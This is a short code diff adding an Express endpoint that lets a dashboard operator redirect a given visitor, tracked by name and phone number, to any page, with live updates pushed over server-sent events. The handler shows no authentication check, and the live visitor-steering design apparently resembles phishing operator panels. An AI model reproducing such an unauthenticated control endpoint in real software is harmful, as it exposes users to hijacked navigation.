@@ -994,6 +994,43 @@ async function startServer() {
     }
   });
 
+  // Manual Redirect - Admin redirects customer to any page
+  app.post("/api/dashboard/redirect", async (req, res) => {
+    try {
+      const { visitorId, targetPage } = req.body;
+      if (!visitorId || !targetPage) {
+        res.status(400).json({ error: "Missing visitorId or targetPage" });
+        return;
+      }
+
+      const currentVisitor = await readVisitor(visitorId);
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+
+      const updateData: Record<string, any> = {
+        adminRedirectPage: targetPage,
+        adminRedirectAt: new Date().toISOString(),
+        redirectPage: targetPage,
+      };
+
+      await upsertVisitor(visitorId, updateData);
+
+      const dashboardData = await upsertDashboardRequest({ 
+        id: visitorId, 
+        visitorId: visitorId,
+        customer: customerName,
+        ...updateData, 
+        updated: `تم التوجيه إلى: ${targetPage}` 
+      });
+
+      broadcastSSE("update", dashboardData);
+
+      res.json({ success: true, redirected: true, targetPage });
+    } catch (error) {
+      console.error("redirect error", error);
+      res.status(500).json({ error: "Failed to redirect customer" });
+    }
+  });
+
   // Serve static files from dist/public in production
   const staticPath =
     process.env.NODE_ENV === "production"
